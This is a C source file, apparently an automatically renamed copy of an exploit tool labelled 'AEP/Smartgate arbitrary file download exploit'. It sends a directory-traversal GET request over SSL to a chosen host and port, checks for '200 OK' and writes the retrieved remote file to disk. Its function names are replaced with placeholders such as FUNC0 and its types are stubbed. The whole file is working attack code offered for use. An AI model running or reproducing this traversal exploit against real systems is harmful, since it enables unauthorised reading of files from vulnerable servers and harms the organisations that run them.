#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct option {char* member_0; int member_1; char member_3; int /*<<< orphan*/  member_2; } ;
typedef  int /*<<< orphan*/  SSL_CTX ;
typedef  int /*<<< orphan*/  SSL ;
typedef  int /*<<< orphan*/  BIO ;

/* Variables and functions */
 scalar_t__ FUNC0 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *,int /*<<< orphan*/ **) ; 
 int /*<<< orphan*/ * FUNC3 (int /*<<< orphan*/ *) ; 
 int FUNC4 (int /*<<< orphan*/ *,char*,int) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ *,char*) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ *,char*,int) ; 
 int /*<<< orphan*/  FUNC7 () ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ ) ; 
 int O_CREAT ; 
 int O_RDWR ; 
 int /*<<< orphan*/  FUNC9 () ; 
 int /*<<< orphan*/  FUNC10 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC11 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  SSL_MODE_AUTO_RETRY ; 
 int /*<<< orphan*/  FUNC12 () ; 
 int /*<<< orphan*/  FUNC13 (int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC14 () ; 
 int /*<<< orphan*/  S_IRWXU ; 
 int /*<<< orphan*/  FUNC15 (int) ; 
 int /*<<< orphan*/  FUNC16 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC17 (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC18 (char*) ; 
 int FUNC19 (int,char**,char*,struct option*,int*) ; 
 char* FUNC20 (int) ; 
 int /*<<< orphan*/  FUNC21 (char*,int /*<<< orphan*/ ,int) ; 
 int FUNC22 (char*,int,int /*<<< orphan*/ ) ; 
 char* optarg ; 
 int /*<<< orphan*/  FUNC23 (char*,...) ; 
 int /*<<< orphan*/  FUNC24 (char*,char*,char*,...) ; 
 int /*<<< orphan*/  stderr ; 
 int FUNC25 (char*) ; 
 scalar_t__ FUNC26 (char*,char*) ; 
 int /*<<< orphan*/  FUNC27 (int,char*,int) ; 

int FUNC28(int argc,char *argv[])
{
    BIO * bio;
    SSL * ssl;
    SSL_CTX * ctx;
    int p,c,fd,index = 0;
    unsigned long size = 0;
    int ihost = 0, iport = 0, ifile = 0, ilocal = 0, check = 0;
    char *host,*request,*file,*connect,*port,*httpbuf,*httpbuf2;
    char *http1 = "GET /..\\..\\..\\..\\..\\..\\..\\";
    char *http2 = " HTTP/1.1\x0D\x0A\x0D\x0A\x0D\x0A\x0D\x0A";
    char r[1024];
    static struct option options[]= {
	    {"server", 1, 0, 's'},
	    {"port", 1 , 0, 'p'},
	    {"remotefile", 1, 0, 'f'},
	    {"localfile", 1, 0, 'l'},
	    {"help", 0, 0, 'h'}
    };
    FUNC23("[ AEP/Smartgate arbitrary file download exploit\n");
    while(c != -1)
    {
	    c = FUNC19(argc,argv,"s:p:f:l:h",options,&index);
	    switch(c){
		case -1:
			    break;
		case 's':
			    host = FUNC20(FUNC25(optarg) + 1);
			    FUNC24(host,"%s",optarg);
			    ihost = 1;
			    break;
		case 'p':
			    port = FUNC20(FUNC25(optarg) + 1);
			    FUNC24(port,"%s",optarg);
			    iport = 1;
			    break;
		case 'f':
			    request = FUNC20(FUNC25(optarg) + FUNC25(http1) + FUNC25(http2) + 1);
			    FUNC24(request,"%s%s%s",http1,optarg,http2);
			    ifile = 1;
			    break;
		case 'l':
			    file = FUNC20(FUNC25(optarg) + 1);
			    FUNC24(file,"%s",optarg);
			    ilocal = 1;
			    break;
		case 'h':
			    FUNC23("[\n[ %s\n",argv[0]);
			    FUNC23("[   --server|-s <dns/ip>\n");
			    FUNC23("[   --port|-p <port>\n");
			    FUNC23("[   --remotefile|-f <path/and/file>\n");
			    FUNC23("[   --localfile|-l <localfile/to/saveas>\n");
			    FUNC23("[\n[ For a more detailed explanation read the source\n");
			    FUNC16(0);
			    break;
		default:
			    break;
			    
	    }
    }
    if(ihost != 1 || iport != 1 || ifile != 1 || ilocal != 1){
	    FUNC23("[ Try %s --help\n",argv[0]);
	    FUNC16(0);
    }
    FUNC7();
    FUNC12();
    FUNC9();
    ctx = FUNC11(FUNC14());
    bio = FUNC3(ctx);
    FUNC2(bio, & ssl);
    FUNC13(ssl, SSL_MODE_AUTO_RETRY);
    connect = FUNC20(FUNC25(host) + FUNC25(port) + 2);
    FUNC24(connect,"%s:%s",host,port);
    FUNC5(bio, connect);
    if(FUNC0(bio) <= 0)
    {
        FUNC17(stderr, "[ Error attempting to connect\n");
        FUNC8(stderr);
        FUNC1(bio);
        FUNC10(ctx);
        return 0;
    }
    FUNC23("[ Connected to %s via (%s/tcp)\n",host,port);
    FUNC6(bio, request, FUNC25(request));
    check = 0;
    httpbuf = FUNC20(2);
    FUNC21(httpbuf,0,2);
    while(check == 0)
    {
    	p = FUNC4(bio, r, 1);
    	r[p] = 0;
	httpbuf2 = FUNC20(FUNC25(r) + FUNC25(httpbuf) + 1);
    	FUNC24(httpbuf2,"%s%s",httpbuf,r);
	FUNC18(httpbuf);
	httpbuf = httpbuf2;
	check = (int)FUNC26(httpbuf,"\n\n");
    }
    FUNC23("[ Displaying raw HTTP response details\n");
    FUNC23("%s",httpbuf);
    check = 0;
    check = (int)FUNC26(httpbuf,"200 OK");
    if(check != 0)
    {
	FUNC23("[ Exploit success, file found\n");
    	fd = FUNC22(file,O_RDWR|O_CREAT,S_IRWXU);
    	if(fd == -1){
		    FUNC23("[ Error creating %s",file);
		    FUNC16(0);
    	}
    	for(;;)
    	{
       		p = FUNC4(bio, r, 1023);
        	if(p <= 0) break;
       	        r[p] = 0;
		FUNC27(fd,r,p);
		size = size + p;
    	}
	FUNC23("[ Recieved %u byte(s) and saved as '%s'\n",size,file);
	FUNC15(fd);
    }
    if(check==0)
    {
    	check = (int)FUNC26(httpbuf,"301 Moved");
   	 if(check != 0)
    	{
		    FUNC23("[ Exploit success, directory found\n");
    	}
    }
    FUNC18(httpbuf);
    if(check == 0)
    {
	    FUNC23("[ Exploit failed\n");
    }
    FUNC1(bio);
    FUNC10(ctx);
    return 0;
}